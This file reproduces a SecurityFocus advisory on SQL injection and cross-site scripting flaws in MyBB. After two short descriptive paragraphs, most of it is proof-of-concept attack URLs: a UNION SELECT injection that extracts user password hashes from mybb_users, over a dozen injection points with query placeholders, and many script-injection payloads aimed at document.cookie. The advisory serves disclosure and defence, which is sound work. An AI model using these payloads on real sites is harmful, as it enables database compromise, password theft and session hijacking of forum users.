@@ -1,0 +1,37 @@
+source: http://www.securityfocus.com/bid/13827/info
+
+MyBB is prone to multiple cross-site scripting and SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+The application is prone to multiple SQL injection vulnerabilities. Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.
+
+The application is also prone to multiple cross-site scripting vulnerabilities. An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/mybb/calendar.php?action=event&eid='%20UNION%20SELECT%20uid,uid,null,null,null,null,password,null%20FROM%20mybb_users/*
+http://www.example.com/mybb/online.php?pidsql=)[sql_query]
+http://www.example.com/mybb/memberlist.php?usersearch=%'[sql_query]
+http://www.example.com/mybb/editpost.php?pid='[sql_query]
+http://www.example.com/mybb/forumdisplay.php?fid='[sql_query]
+http://www.example.com/mybb/newreply.php?tid='[sql_query]
+http://www.example.com/mybb/search.php?action=results&sid='[sql_query]
+http://www.example.com/mybb/showthread.php?tid='[sql_query]
+http://www.example.com/mybb/showthread.php?pid='[sql_query]
+http://www.example.com/mybb/usercp2.php?tid='[sql_query]
+http://www.example.com/mybb/printthread.php?tid='[sql_query]
+http://www.example.com/mybb/reputation.php?pid='[sql_query]
+http://www.example.com/mybb/portal.php?action=do_login&username='[sql_query]
+http://www.example.com/mybb/polls.php?action=newpoll&tid='[sql_query]
+http://www.example.com/mybb/ratethread.php?tid='[sql_query]
+
+http://www.example.com/mybb/misc.php?action=syndication&forums[0]=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/mybb/misc.php?action=syndication&forums[0]=0&version=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/mybb/misc.php?action=syndication&limit=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/mybb/forumdisplay.php?fid=1&datecut=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/mybb/forumdisplay.php?fid=2&page=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/mybb/member.php?agree=I+Agree&username=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/mybb/member.php?agree=I+Agree&email=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/mybb/member.php?agree=I+Agree&email2=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/mybb/memberlist.php?page=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/mybb/memberlist.php?usersearch=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/mybb/showthread.php?mode=linear&tid=1&pid=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/mybb/showthread.php?mode=linear&tid=1%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/mybb/printthread.php?tid=1%3Cscript%3Ealert(document.cookie)%3C/script%3E
